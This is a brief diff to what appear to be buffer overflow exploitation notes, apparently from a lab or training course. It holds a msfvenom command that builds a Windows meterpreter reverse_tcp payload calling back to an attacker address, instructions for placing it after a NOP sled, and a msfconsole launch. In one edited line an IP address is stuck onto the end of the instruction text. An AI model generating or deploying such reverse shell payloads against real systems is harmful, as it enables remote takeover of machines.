@@ -190,7 +190,7 @@ Buffer Overflow:
     #################################################################################
 
     msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.23.0 lport=4444 -b "\x00" -f python
-    copy payload to script after NOP sled line
+    copy payload to script after NOP sled line192.168.28.179
     DO NOT COPY: buf = b""
 
     msfconsole
